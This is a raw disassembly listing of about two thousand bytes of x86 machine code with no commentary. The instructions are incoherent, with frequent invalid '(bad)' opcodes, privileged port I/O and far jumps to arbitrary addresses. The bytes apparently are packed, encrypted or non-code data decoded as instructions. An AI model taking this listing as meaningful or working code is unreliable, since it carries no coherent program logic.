  417383:	mov    ds:0x526ce10d,al
  417388:	(bad)  
  41738a:	or     BYTE PTR [edx],dl
  41738c:	pop    eax
  41738d:	cld    
  41738e:	mov    eax,ds:0x702b7edd
  417393:	jae    0x4173f9
  417395:	adc    DWORD PTR ds:0x5c7b647d,0x76
  41739c:	add    cl,ah
  41739e:	sbb    al,0xce
  4173a0:	pop    esp
  4173a1:	cmp    eax,0x8051569d
  4173a6:	popf   
  4173a7:	ret    
  4173a8:	mov    ebx,DWORD PTR [esi-0x49]
  4173ab:	and    al,0x53
  4173ad:	mov    dh,0x4d
  4173af:	cmp    al,0xb8
  4173b1:	or     eax,0xf1fdf2d6
  4173b6:	sahf   
  4173b7:	xchg   DWORD PTR [edx+0x45],ecx
  4173ba:	inc    edx
  4173bb:	or     ebp,edx
  4173bd:	inc    edi
  4173be:	push   edi
  4173bf:	lods   al,BYTE PTR ds:[esi]
  4173c0:	jp     0x417430
  4173c2:	push   edx
  4173c3:	ja     0x417398
  4173c5:	mov    dl,0x9d
  4173c7:	or     DWORD PTR [edi-0x24],0x618524de
  4173ce:	sbb    eax,0x83e217c
  4173d3:	pop    esi
  4173d4:	mov    es,WORD PTR [edx]
  4173d6:	into   
  4173d7:	sub    BYTE PTR [eax+edi*1],0xeb
  4173db:	mov    eax,0x88fe23bb
  4173e0:	lock cld 
  4173e2:	jl     0x4173ed
  4173e4:	add    edi,esi
  4173e6:	mov    es,WORD PTR [edi-0x74516df]
  4173ec:	in     eax,0x71
  4173ee:	out    dx,al
  4173ef:	inc    ebp
  4173f0:	cld    
  4173f1:	push   esi
  4173f2:	pop    eax
  4173f3:	cmc    
  4173f4:	dec    ebp
  4173f5:	jae    0x4173c6
  4173f7:	(bad)  [edx+eax*2]
  4173fa:	cli    
  4173fb:	mov    ebp,0x512afd5a
  417400:	dec    ebx
  417401:	pop    edx
  417402:	cmp    BYTE PTR [eax+ebp*4-0x7d],ah
  417406:	es (bad) 
  417408:	jns    0x4173d5
  41740a:	ins    BYTE PTR es:[edi],dx
  41740b:	sbb    DWORD PTR fs:[ebx-0x18],esp
  41740f:	add    al,0x7d
  417411:	jecxz  0x417434
  417413:	jle    0x41744a
  417415:	push   cs
  417416:	xor    DWORD PTR [edx+0x16],edx
  417419:	(bad)  
  41741a:	and    eax,0xea3e2634
  41741f:	add    ebx,ebp
  417421:	out    dx,al
  417422:	push   ss
  417423:	jl     0x41747a
  417425:	mov    ds:0x66ee6de7,al
  41742a:	mov    BYTE PTR ds:0x69f80cab,dl
  417430:	push   edi
  417431:	inc    edi
  417432:	add    eax,0xf1d67f07
  417437:	ins    DWORD PTR es:[edi],dx
  417438:	scas   eax,DWORD PTR es:[edi]
  417439:	sub    ecx,DWORD PTR [eax+0x31]
  41743c:	ret    
  41743d:	scas   eax,DWORD PTR es:[edi]
  41743e:	adc    edx,edx
  417440:	test   esp,edi
  417442:	jns    0x4173cc
  417444:	into   
  417445:	bound  ecx,QWORD PTR [edi+0x53f77516]
  41744b:	xor    dh,bh
  41744d:	loop   0x41748c
  41744f:	sbb    eax,0xbdb6f2e
  417454:	or     ah,BYTE PTR [edx-0x5c]
  417457:	jb     0x417401
  417459:	jne    0x41745e
  41745b:	pop    ebx
  41745c:	idiv   BYTE PTR [eax]
  41745e:	cmc    
  41745f:	dec    ecx
  417460:	adc    bl,BYTE PTR [esi-0x7d]
  417463:	push   cs
  417464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417465:	das    
  417466:	jmp    0x897f:0x89a0b80c
  41746d:	and    al,0xa5
  41746f:	sub    al,0x89
  417471:	mov    ds:0xe10b22e0,al
  417476:	hlt    
  417477:	adc    ah,0xac
  41747a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41747b:	xchg   edx,eax
  41747c:	aaa    
  41747d:	xchg   ecx,eax
  41747e:	test   BYTE PTR [edx-0x2ad8aaf2],dl
  417484:	xchg   DWORD PTR [edi+0x5],edx
  417487:	jg     0x4174c2
  417489:	mov    WORD PTR [esi-0x2fe2cb5e],es
  41748f:	mov    ebp,DWORD PTR [eax+0x44ba8114]
  417495:	jl     0x41743b
  417497:	scas   eax,DWORD PTR es:[edi]
  417498:	mov    ds:0xcd8961d4,al
  41749d:	data16 mov al,BYTE PTR [edx-0x70]
  4174a1:	cmp    DWORD PTR [esi-0x4f],esp
  4174a4:	outs   dx,BYTE PTR ds:[esi]
  4174a5:	cld    
  4174a6:	push   cs
  4174a7:	fldenv [ebx]
  4174a9:	cmp    ah,BYTE PTR [ecx+0x7d]
  4174ac:	inc    eax
  4174ad:	pop    esi
  4174ae:	ret    
  4174af:	sub    al,0xaf
  4174b1:	and    ebp,DWORD PTR [edi-0x1ab0f776]
  4174b7:	inc    ecx
  4174b8:	js     0x41745c
  4174ba:	cs and eax,0xc66e41ec
  4174c0:	xor    eax,0xe96ea64f
  4174c5:	pop    ecx
  4174c6:	ds push edi
  4174c8:	add    edx,edx
  4174ca:	mov    ebp,0xba0232cb
  4174cf:	jecxz  0x417515
  4174d1:	and    BYTE PTR [edx+0x1e8185ee],dl
  4174d7:	iret   
  4174d8:	dec    ecx
  4174d9:	sbb    eax,0x253bc3ee
  4174de:	test   al,0xa9
  4174e0:	test   cl,0x9b
  4174e3:	stos   DWORD PTR es:[edi],eax
  4174e4:	or     al,BYTE PTR [ebp-0x5e]
  4174e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174e8:	dec    ecx
  4174e9:	pusha  
  4174ea:	adc    al,0x6b
  4174ec:	rol    DWORD PTR [esi+0x74],cl
  4174ef:	int    0xf5
  4174f1:	push   esi
  4174f2:	sbb    eax,0x168dcdd3
  4174f7:	rcr    esp,cl
  4174f9:	cmp    eax,0xc09e9460
  4174fe:	mov    edi,0x33cf3c46
  417503:	test   eax,0x6c54732d
  417508:	lods   eax,DWORD PTR ds:[esi]
  417509:	mov    ah,0x26
  41750b:	push   0xb80476a7
  417510:	into   
  417511:	jbe    0x417580
  417513:	xchg   esi,eax
  417514:	mov    dl,0xf7
  417516:	mov    cl,0x7a
  417518:	arpl   bx,si
  41751a:	xor    ebp,esp
  41751c:	xchg   ebx,eax
  41751d:	jle    0x41757c
  41751f:	jl     0x4174e2
  417521:	and    ebx,DWORD PTR [esi+ecx*8-0x41cc9d8b]
  417528:	imul   DWORD PTR [edx-0x7ad81f4]
  41752e:	or     al,0x11
  417530:	jl     0x41755d
  417532:	lods   eax,DWORD PTR ds:[esi]
  417533:	push   cs
  417534:	dec    esp
  417535:	jl     0x417556
  417537:	shl    cl,0x88
  41753a:	loopne 0x4174c1
  41753c:	es and edi,edx
  41753f:	(bad)  
  417540:	outs   dx,DWORD PTR ds:[esi]
  417541:	mov    ebp,DWORD PTR ds:0xa517e0a
  417547:	clc    
  417548:	daa    
  417549:	scas   eax,DWORD PTR es:[edi]
  41754a:	jmp    0x41757b
  41754c:	popf   
  41754d:	mov    ah,0x8d
  41754f:	fs push ebp
  417551:	cdq    
  417552:	jmp    0x96a1fb6
  417557:	jo     0x417530
  417559:	repz fadd QWORD PTR [ebx+0x3f96d346]
  417560:	adc    esp,edi
  417562:	(bad)  
  417563:	popa   
  417564:	(bad)  
  417566:	mov    dh,0xfc
  417568:	mov    ah,BYTE PTR [ebp-0x36252c09]
  41756e:	jnp    0x41756d
  417570:	cdq    
  417571:	imul   ecx,ecx,0x6c4e2789
  417577:	scas   eax,DWORD PTR es:[edi]
  417578:	push   0x73
  41757a:	bound  edx,QWORD PTR [edx+0x23]
  41757d:	loope  0x41754e
  41757f:	inc    edi
  417580:	cmp    ebp,DWORD PTR [ecx]
  417582:	or     esp,edx
  417584:	push   edx
  417585:	popa   
  417586:	aam    0x68
  417588:	mov    dl,0xfe
  41758a:	test   eax,0x815ea037
  41758f:	mov    ds,WORD PTR [ebp-0x7a]
  417592:	jl     0x4175fa
  417594:	push   0x9c0e2ab9
  417599:	mov    ah,0xf1
  41759b:	cmp    ch,BYTE PTR [esp+esi*8-0x55]
  41759f:	rol    bl,cl
  4175a1:	sub    DWORD PTR [esi],eax
  4175a3:	xlat   BYTE PTR ds:[ebx]
  4175a4:	hlt    
  4175a5:	mov    ds:0xe6ec8aaa,al
  4175aa:	mov    cl,0x52
  4175ac:	fnstcw WORD PTR [ecx]
  4175ae:	outs   dx,BYTE PTR ds:[esi]
  4175af:	ret    0x1ff4
  4175b2:	mov    dl,0x4c
  4175b4:	sar    DWORD PTR [ecx+0x2fbaf633],1
  4175ba:	(bad)  
  4175bb:	scas   eax,DWORD PTR es:[edi]
  4175bc:	cld    
  4175bd:	xchg   ebp,eax
  4175be:	retf   
  4175bf:	adc    al,0xfa
  4175c1:	dec    eax
  4175c2:	xchg   ecx,eax
  4175c3:	in     eax,dx
  4175c4:	scas   eax,DWORD PTR es:[edi]
  4175c5:	pop    ebx
  4175c6:	pop    ecx
  4175c7:	and    al,BYTE PTR [ebp-0x4f804189]
  4175cd:	xchg   edi,eax
  4175ce:	adc    bl,BYTE PTR [ebp+ecx*1-0x2c62993]
  4175d5:	sub    eax,0x2151401a
  4175da:	mov    al,gs:0xb445b3dd
  4175e0:	loopne 0x4175b2
  4175e2:	sbb    ch,al
  4175e4:	inc    edi
  4175e5:	test   eax,0xe44a948b
  4175ea:	or     al,0x8b
  4175ec:	cs dec ebp
  4175ee:	test   DWORD PTR [eiz*4-0x6c18da8e],edx
  4175f5:	imul   ebx,DWORD PTR [ebx-0x66],0xfffffff8
  4175f9:	leave  
  4175fa:	outs   dx,BYTE PTR ds:[esi]
  4175fb:	call   0x8239a7aa
  417600:	xchg   edx,edx
  417602:	mov    DWORD PTR [edi],esp
  417604:	js     0x41766f
  417606:	inc    ebp
  417607:	add    BYTE PTR [ecx+ebx*4],bl
  41760a:	push   esi
  41760b:	inc    ecx
  41760c:	pop    esi
  41760d:	cmc    
  41760e:	add    eax,0x4aff0851
  417613:	cli    
  417614:	mov    edx,DWORD PTR [eax]
  417616:	nop
  417617:	pop    edx
  417618:	call   0x301dbb8
  41761d:	stos   DWORD PTR es:[edi],eax
  41761e:	aam    0xf3
  417620:	pop    eax
  417621:	in     al,dx
  417622:	add    DWORD PTR [edi+eax*1+0x2b56652a],eax
  417629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41762a:	fisub  WORD PTR [edx-0x80]
  41762d:	pop    edx
  41762e:	gs ins BYTE PTR es:[edi],dx
  417630:	xor    al,0x70
  417632:	fmul   QWORD PTR [ecx-0x3d]
  417635:	(bad)  
  417636:	mov    ch,0xe9
  417638:	in     al,0x17
  41763a:	repz or BYTE PTR [ecx],cl
  41763d:	scas   eax,DWORD PTR es:[edi]
  41763e:	(bad)  
  417640:	pop    ecx
  417641:	or     ch,BYTE PTR [edi]
  417643:	push   ds
  417644:	mov    al,ds:0x1bab5f91
  417649:	into   
  41764a:	pop    ds
  41764b:	pop    ecx
  41764c:	xchg   ebp,eax
  41764d:	dec    eax
  41764e:	xor    DWORD PTR [eax+ebx*8],eax
  417651:	push   ds
  417652:	pop    es
  417653:	in     eax,0x4e
  417655:	xchg   edx,eax
  417656:	cmp    BYTE PTR [esi-0x69b4836a],0x42
  41765d:	mov    DWORD PTR [edi],eax
  41765f:	jbe    0x417642
  417661:	or     DWORD PTR [edi+0x41a51461],edx
  417667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417668:	push   0x7a04ba54
  41766d:	sti    
  41766e:	retf   0x94a2
  417671:	or     BYTE PTR [edi+ecx*4+0x35f23156],dl
  417678:	das    
  417679:	mov    DWORD PTR [ebx],edx
  41767b:	fstp   QWORD PTR [edi-0x77]
  41767e:	adc    ah,ah
  417680:	or     ecx,edx
  417682:	mov    WORD PTR fs:[esp+ebx*4+0xc],ds
  417687:	dec    edx
  417688:	sar    DWORD PTR [ebp-0x66bc590d],1
  41768e:	popa   
  41768f:	in     al,0xc9
  417691:	sbb    DWORD PTR [edi+edi*2-0x5f],0x9a709ab1
  417699:	jle    0x4176c0
  41769b:	xcrypt-cbc (bad)
  41769c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41769d:	xchg   esp,eax
  41769e:	lods   al,BYTE PTR ds:[esi]
  41769f:	divps  xmm7,XMMWORD PTR [esi+0x2d]
  4176a3:	xor    eax,0xcb50b1b9
  4176a8:	mov    ah,0x89
  4176aa:	xor    DWORD PTR [ebx+0x61],esp
  4176ad:	adc    ch,bl
  4176af:	sub    eax,0xc27fabff
  4176b4:	and    eax,0x6f92fbd1
  4176b9:	es pushf 
  4176bb:	sbb    BYTE PTR [edi-0x1e70e8ab],dh
  4176c1:	or     bl,BYTE PTR [ebx-0x17]
  4176c4:	inc    eax
  4176c5:	mov    BYTE PTR [eax],bl
  4176c7:	lea    edi,[edi-0x63fe5041]
  4176cd:	rol    DWORD PTR [ecx-0x150458a2],1
  4176d3:	jnp    0x4176ec
  4176d5:	xchg   edi,eax
  4176d6:	or     esp,esi
  4176d8:	cmp    DWORD PTR [esi+0x2f1d649f],esp
  4176de:	adc    BYTE PTR [ecx+0x186fc563],0x45
  4176e5:	nop
  4176e6:	pop    edx
  4176e7:	inc    esp
  4176e8:	xor    al,0xdc
  4176ea:	lock dec edx
  4176ec:	fild   QWORD PTR [edx+ebp*8]
  4176ef:	mov    ebx,0x102a5892
  4176f4:	and    dl,BYTE PTR [ebx+0x1477fd95]
  4176fa:	add    al,0xf8
  4176fc:	sahf   
  4176fd:	and    dl,bl
  4176ff:	mov    al,ds:0xa4cb0b5b
  417704:	jg     0x4176dd
  417706:	mov    bl,0x39
  417708:	nop
  417709:	xor    eax,0x7d9faca
  41770e:	xor    BYTE PTR [ebx-0x4],bl
  417711:	push   edi
  417712:	add    eax,0x3882b22e
  417717:	or     ebp,DWORD PTR [edx]
  417719:	popf   
  41771a:	mov    dh,0x7c
  41771c:	out    0xd5,al
  41771e:	icebp  
  41771f:	mov    dh,0xdd
  417721:	add    eax,0xe444dba4
  417726:	jp     0x41770f
  417728:	repz out 0x3a,al
  41772b:	cwde   
  41772c:	and    al,0x5d
  41772e:	das    
  41772f:	or     ecx,DWORD PTR [edx-0x62]
  417732:	cmp    cl,bl
  417734:	pop    ebx
  417735:	mov    bl,0xdc
  417737:	into   
  417738:	pop    ss
  417739:	jmp    0x417775
  41773b:	push   ebp
  41773c:	sub    DWORD PTR [ebp-0x59],0x487dd3c2
  417743:	sahf   
  417744:	das    
  417745:	repz iret 
  417747:	inc    esp
  417748:	inc    ebx
  417749:	inc    esi
  41774a:	pop    eax
  41774b:	sti    
  41774c:	mov    edx,0x2786800e
  417751:	inc    ecx
  417752:	xor    ch,al
  417754:	(bad)  
  417755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417756:	fidivr DWORD PTR [edi-0x2]
  417759:	pushf  
  41775a:	nop
  41775b:	lods   eax,DWORD PTR ds:[esi]
  41775c:	aad    0xd2
  41775e:	cmp    cl,al
  417760:	jmp    0x8afc:0x66c972b6
  417767:	xor    BYTE PTR ds:0xa88ee5b5,bh
  41776d:	mov    bh,BYTE PTR [esi+0x6246698d]
  417773:	into   
  417774:	mov    ebx,ecx
  417776:	mov    al,ds:0x632aa4b0
  41777b:	mov    ds:0x7025e2bc,al
  417780:	mov    ch,0xf6
  417782:	add    ebx,ebp
  417784:	loope  0x41776f
  417786:	shr    BYTE PTR [ecx+0x425ef8be],1
  41778c:	or     DWORD PTR [esi+0x33eb97f4],0x62990fd1
  417796:	add    dh,dl
  417798:	and    eax,0x2198fad0
  41779d:	cmp    ecx,DWORD PTR [esi-0x1a]
  4177a0:	jg     0x417806
  4177a2:	dec    esp
  4177a3:	aad    0xf7
  4177a5:	pop    edi
  4177a6:	fimul  WORD PTR [ebp-0x66]
  4177a9:	mov    dl,0x5e
  4177ab:	pop    edi
  4177ac:	shr    DWORD PTR [esi+0x62],0xf9
  4177b0:	retf   0x80b4
  4177b3:	ja     0x41781e
  4177b5:	push   ss
  4177b6:	push   ss
  4177b7:	mov    BYTE PTR ds:0x802ce70c,ah
  4177bd:	or     al,0xdc
  4177bf:	lods   al,BYTE PTR ds:[esi]
  4177c0:	mov    edx,0x23bf90
  4177c5:	cmp    BYTE PTR [ebx-0x5edb3917],bh
  4177cb:	lods   al,BYTE PTR ds:[esi]
  4177cc:	jmp    0x2fd351d7
  4177d1:	push   edx
  4177d2:	inc    ebp
  4177d3:	lods   eax,DWORD PTR ds:[esi]
  4177d4:	fiadd  DWORD PTR [eax+0x34]
  4177d7:	jb     0x41781d
  4177d9:	pop    ds
  4177da:	xor    al,0x5f
  4177dc:	ins    DWORD PTR es:[edi],dx
  4177dd:	aad    0x47
  4177df:	clc    
  4177e0:	xor    esi,ecx
  4177e2:	mov    DWORD PTR [eax*2-0x45d1b92e],ebp
  4177e9:	or     al,0x92
  4177eb:	xor    DWORD PTR [ecx-0x13],ebx
  4177ee:	pop    es
  4177ef:	aam    0xdf
  4177f1:	mov    edx,0x28f1494e
  4177f6:	sub    al,0x1d
  4177f8:	mov    edx,0xb8ef4cfd
  4177fd:	push   cs
  4177fe:	outs   dx,DWORD PTR ds:[esi]
  4177ff:	in     al,0xc1
  417801:	lea    edx,[eax+0xc]
  417804:	xchg   edx,eax
  417805:	ret    0x4c57
  417808:	jl     0x41785e
  41780a:	adc    BYTE PTR [ecx-0x42],0x95
  41780e:	add    eax,0x1d754d23
  417813:	fist   WORD PTR [ebx+0x1f02f958]
  417819:	lds    edx,FWORD PTR [esi-0x7490fac1]
  41781f:	scas   eax,DWORD PTR es:[edi]
  417820:	mov    BYTE PTR ds:0x2ffb4e35,dh
  417826:	xchg   edi,eax
  417827:	jmp    0xe8d2:0xdba9015e
  41782e:	cld    
  41782f:	(bad)  
  417830:	push   ebp
  417831:	and    BYTE PTR [edi-0x71],0x26
  417835:	push   es
  417836:	out    dx,eax
  417837:	dec    ecx
  417838:	and    eax,0xedaf81af
  41783d:	mov    al,ds:0x56a43c
  417842:	mov    dl,0x5e
  417844:	adc    BYTE PTR es:[eax-0x3],al
  417848:	xor    BYTE PTR [esi],ah
  41784a:	pop    ecx
  41784b:	lods   al,BYTE PTR ds:[esi]
  41784c:	lea    ebp,[edx-0x13]
  41784f:	mov    eax,ds:0x71d9ff2b
  417854:	xchg   BYTE PTR [esi-0x3a62ff6f],ah
  41785a:	in     al,dx
  41785b:	stc    
  41785c:	xor    DWORD PTR [ecx+0x3d19cfe4],esi
  417862:	mov    al,0x63
  417864:	and    al,0x5b
  417866:	hlt    
  417867:	enter  0xad15,0x14
  41786b:	push   edx
  41786c:	clc    
  41786d:	and    DWORD PTR [eax],0xfffffffd
  417870:	mov    ebx,0x92e3e41
  417875:	mov    ebp,0xb7b03cdb
  41787a:	mov    WORD PTR [edx-0x7205efd4],ds
  417880:	or     eax,0xbe496345
  417885:	in     eax,dx
  417886:	mov    cl,0x8d
  417888:	outs   dx,BYTE PTR ds:[esi]
  417889:	jp     0x41785e
  41788b:	adc    edx,DWORD PTR [esi-0x29]
  41788e:	nop
  41788f:	or     al,0xda
  417891:	dec    edx
  417892:	arpl   WORD PTR [ebp+0x3ad74301],ax
  417898:	dec    eax
  417899:	mov    eax,ds:0x723b6c9c
  41789e:	int3   
  41789f:	adc    al,0x12
  4178a1:	xchg   edi,eax
  4178a2:	pop    es
  4178a3:	js     0x417875
  4178a5:	mov    ch,0xb8
  4178a7:	call   0xd7dc:0x5f02707d
  4178ae:	clc    
  4178af:	cmc    
  4178b0:	xchg   esi,eax
  4178b1:	dec    ecx
  4178b2:	(bad)  
  4178b3:	sbb    BYTE PTR [ebx+ebp*8+0x538e25c3],ch
  4178ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178bb:	dec    edi
  4178bc:	push   eax
  4178bd:	mov    eax,0xb7a54ab0
  4178c2:	pop    ds
  4178c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178c4:	dec    esp
  4178c5:	adc    eax,0xe4059204
  4178ca:	(bad)  
  4178cb:	and    al,0x72
  4178cd:	in     eax,0x8a
  4178cf:	mov    dl,0xc1
  4178d1:	fistp  WORD PTR [edi]
  4178d3:	inc    ebp
  4178d4:	in     al,0x8d
  4178d6:	jg     0x4178f3
  4178d8:	pop    ebp
  4178d9:	lahf   
  4178da:	mov    WORD PTR [esi],es
  4178dc:	mov    eax,ds:0xa3f88220
  4178e1:	cwde   
  4178e2:	mov    dh,0x9
  4178e4:	in     eax,dx
  4178e5:	sbb    BYTE PTR [edx+0x565a394f],0x1f
  4178ec:	fsub   DWORD PTR [edi]
  4178ee:	pop    edx
  4178f0:	ss xchg ebx,eax
  4178f2:	js     0x417891
  4178f4:	xor    ecx,DWORD PTR [ecx-0x21243421]
  4178fa:	xor    eax,0x2b2fb76d
  4178ff:	xchg   ah,dl
  417901:	pop    eax
  417902:	dec    ebp
  417903:	or     BYTE PTR [eax-0x43],bh
  417906:	jno    0x4178c9
  417908:	jae    0x417937
  41790a:	add    al,0x65
  41790c:	mov    ds:0x196aa025,eax
  417911:	out    0x27,eax
  417913:	cdq    
  417914:	xchg   ebx,eax
  417915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417916:	adc    al,0xfc
  417918:	push   ecx
  417919:	dec    esp
  41791a:	sub    ebp,ecx
  41791c:	inc    eax
  41791d:	or     BYTE PTR [ebx+eax*2-0x4e850963],bl
  417924:	adc    eax,0xc77af2f5
  417929:	sub    cl,BYTE PTR [eax-0x30]
  41792c:	fcmovne st,st(6)
  41792e:	jecxz  0x417999
  417930:	fwait
  417931:	push   0xdd3b242d
  417936:	add    DWORD PTR [edx+0x73],edi
  417939:	popf   
  41793a:	sti    
  41793b:	int3   
  41793c:	jecxz  0x4178cb
  41793e:	aas    
  41793f:	cmp    BYTE PTR [edi],cl
  417941:	and    DWORD PTR [edx-0x5f],0x8e562f48
  417948:	popa   
  417949:	jp     0x4178f0
  41794b:	fiadd  WORD PTR [ecx+0x5]
  41794e:	xlat   BYTE PTR ds:[ebx]
  41794f:	mov    ch,0x28
  417951:	ins    DWORD PTR es:[edi],dx
  417952:	or     al,0x2e
  417954:	jmp    0x60de9cad
  417959:	mov    edi,0xe897665c
  41795e:	dec    esi
  41795f:	cmp    BYTE PTR [edx+0x6b],al
  417962:	cmp    cl,BYTE PTR [eax-0x51e8e282]
  417968:	pop    esi
  417969:	add    eax,DWORD PTR [ebx+0x25]
  41796c:	(bad)  
  41796d:	out    dx,al
  41796e:	jp     0x4179ce
  417970:	dec    ebx
  417971:	push   0x64
  417973:	(bad)  
  417974:	xor    eax,0xf78abaa8
  417979:	fidiv  WORD PTR [ebx+0xb]
  41797c:	jb     0x417969
  41797e:	cmp    ebx,DWORD PTR [ecx-0x2f]
  417981:	xchg   edx,eax
  417982:	mov    dl,0xff
  417984:	rcl    DWORD PTR [ecx+0x918f760],cl
  41798a:	push   0xb3de8ea4
  41798f:	shr    BYTE PTR [edi+ecx*8-0x4ce7ff52],0xd9
  417997:	mov    edx,0xa9be4724
  41799c:	fdiv   DWORD PTR [ebx+0x2a6e7a13]
  4179a2:	into   
  4179a3:	daa    
  4179a4:	out    dx,eax
  4179a5:	add    eax,0x68882c83
  4179aa:	aaa    
  4179ab:	inc    edi
  4179ac:	cmp    al,0x51
  4179ae:	jne    0x41796b
  4179b0:	push   ss
  4179b1:	xor    DWORD PTR [edx+0x27],edi
  4179b4:	or     eax,0x7aea4816
  4179b9:	ins    DWORD PTR es:[edi],dx
  4179ba:	cmp    edx,ebx
  4179bc:	je     0x417a2e
  4179be:	ret    0x8d98
  4179c1:	mov    bh,0x13
  4179c3:	pop    ss
  4179c4:	(bad)  
  4179c5:	(bad)  [eax+0x1f]
  4179c8:	add    DWORD PTR [ebx-0x5a],edx
  4179cb:	and    DWORD PTR [edi+ebx*1],edx
  4179ce:	or     bl,BYTE PTR [ebp-0x14]
  4179d1:	sbb    edi,ecx
  4179d3:	sbb    DWORD PTR [ecx-0x798ad0a0],eax
  4179d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179da:	aaa    
  4179db:	inc    ecx
  4179dc:	mov    ah,0x66
  4179de:	imul   eax,DWORD PTR [ecx-0x1557c472],0x3e
  4179e5:	fnstcw WORD PTR [ebx+ecx*2-0x182d6e1c]
  4179ec:	adc    edx,DWORD PTR [esi]
  4179ee:	mov    ds:0x5bb00d82,al
  4179f3:	out    0x2a,eax
  4179f5:	mov    BYTE PTR [eax+0x336d5330],dl
  4179fb:	pushf  
  4179fc:	dec    edi
  4179fd:	cld    
  4179fe:	dec    ebx
  4179ff:	imul   ecx,ebp,0x69
  417a02:	mov    dl,0x58
  417a04:	and    bl,BYTE PTR [esi]
  417a06:	test   al,0xe8
  417a08:	ficom  WORD PTR [ebp-0x47]
  417a0b:	iret   
  417a0c:	or     eax,0xcae0ed82
  417a11:	mov    dl,0x3f
  417a13:	or     ah,BYTE PTR [eax-0x3a]
  417a16:	(bad)  
  417a17:	retf   
  417a18:	xor    ecx,DWORD PTR [eax-0x4d]
  417a1b:	push   eax
  417a1c:	std    
  417a1d:	mov    esp,0xe415f410
  417a22:	test   BYTE PTR [edx],0xd5
  417a25:	(bad)  
  417a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a27:	pop    edi
  417a28:	cmp    eax,0x7195b0cd
  417a2d:	sbb    al,0xb4
  417a2f:	test   al,0xe5
  417a31:	stos   DWORD PTR es:[edi],eax
  417a32:	lea    ecx,[esi]
  417a34:	ss xchg ebx,eax
  417a36:	push   ecx
  417a37:	mov    ecx,0xc8842a5d
  417a3c:	les    ecx,FWORD PTR [ebx-0x4e]
  417a3f:	cdq    
  417a40:	enter  0x763f,0xbe
  417a44:	push   edi
  417a45:	ins    BYTE PTR es:[edi],dx
  417a46:	jns    0x417a50
  417a48:	push   edi
  417a49:	popf   
  417a4a:	mov    bl,0x40
  417a4c:	adc    DWORD PTR [esi+0x683a8c6f],ecx
  417a52:	std    
  417a53:	into   
  417a54:	add    ebx,edi
  417a56:	pop    ebx
  417a57:	dec    eax
  417a58:	adc    cl,dl
  417a5a:	rcr    ebx,cl
  417a5c:	add    BYTE PTR [ebx-0x75b2057d],0x5
  417a63:	pushf  
  417a64:	popa   
  417a65:	popa   
  417a66:	cld    
  417a67:	and    DWORD PTR [ecx+ebx*2-0x4a],0x71
  417a6c:	popf   
  417a6d:	icebp  
  417a6e:	mov    edi,esi
  417a70:	push   edi
  417a71:	ficomp WORD PTR [ebx-0x5ad2161a]
  417a77:	jl     0x417aab
  417a79:	mov    bl,0xe1
  417a7b:	xor    DWORD PTR [ebx*8+0x40d9ffaa],ebx
  417a82:	xlat   BYTE PTR ds:[ebx]
  417a83:	(bad)
  417a86:	xchg   BYTE PTR [ebx],ch
  417a88:	(bad)  [edx]
  417a8a:	push   esp
  417a8b:	push   ebp
  417a8c:	mov    es:0xfe1e07f1,al
  417a92:	or     BYTE PTR [ecx],ch
  417a94:	xchg   ebp,eax
  417a95:	push   esi
  417a96:	cmp    al,0xcc
  417a98:	mov    ah,0xb7
  417a9a:	rcl    DWORD PTR [eax+0x3f],cl
  417a9d:	fcom   DWORD PTR [ebx+0x11]
  417aa0:	jle    0x417a82
  417aa2:	push   ebx
  417aa3:	push   es
  417aa4:	cmp    dl,BYTE PTR ds:[edi-0x356f1105]
  417aab:	aaa    
  417aac:	inc    ebp
  417aad:	xor    eax,0x255f39eb
  417ab2:	push   edi
  417ab3:	mov    dl,0xaa
  417ab5:	adc    al,0x3
  417ab7:	or     al,0xc4
  417ab9:	and    BYTE PTR [eax],cl
  417abb:	pop    edx
  417abc:	sub    esp,edi
  417abe:	(bad)  
  417abf:	fsub   QWORD PTR ds:0x669beef2
  417ac5:	int3   
  417ac6:	out    dx,al
  417ac7:	xchg   ebx,eax
  417ac8:	cmp    BYTE PTR [esp+ebx*1-0x4df4b3ab],dh
  417acf:	stos   DWORD PTR es:[edi],eax
  417ad0:	loopne 0x417aa8
  417ad2:	shr    BYTE PTR [ebx-0x50],1
  417ad5:	ret    
  417ad6:	mov    edx,0x240baee4
  417adb:	mov    eax,DWORD PTR [edx+0x27]
  417ade:	test   BYTE PTR [ebx+ebp*8],dl
  417ae1:	jo     0x417a9f
  417ae3:	add    bh,BYTE PTR [ebx]
  417ae5:	mov    al,0x24
  417ae7:	imul   esp,DWORD PTR [ebx-0x59],0x50
  417aeb:	(bad)  [eax+0x74]
  417aee:	arpl   WORD PTR [esi-0x4135ba8f],sp
  417af4:	pusha  
  417af5:	mov    ch,0x4a
  417af7:	inc    ebx
  417af8:	in     al,0x4b
  417afa:	retf   0x81ac
  417afd:	pop    ecx
  417afe:	jb     0x417aee
  417b00:	inc    esp
  417b01:	adc    edi,DWORD PTR [esi+0x5]
  417b04:	push   edi
  417b05:	ret    
  417b06:	inc    ebx
  417b07:	nop
  417b08:	fmul   QWORD PTR [eax-0x28]
  417b0b:	(bad)  
  417b0c:	gs add ecx,ecx
  417b0f:	test   al,0x62
  417b11:	jae    0x417ab7
  417b13:	jecxz  0x417b0a
  417b15:	(bad)  
  417b16:	loopne 0x417a9c
  417b18:	sub    bh,al
  417b1a:	test   BYTE PTR [ecx-0x60],bl
  417b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b1e:	clc    
  417b1f:	jecxz  0x417b8c
  417b21:	outs   dx,BYTE PTR ds:[esi]
  417b22:	xor    edi,DWORD PTR [edi+edx*4]
  417b25:	gs stc 
  417b27:	mov    cl,0xf8
  417b29:	(bad)  
  417b2b:	mov    dh,0xc5
  417b2d:	mov    ds:0x5f84ae8a,al
  417b32:	cli    
  417b33:	lods   al,BYTE PTR ds:[esi]
  417b34:	mov    al,ds:0x54021bbd
  417b39:	push   ebp
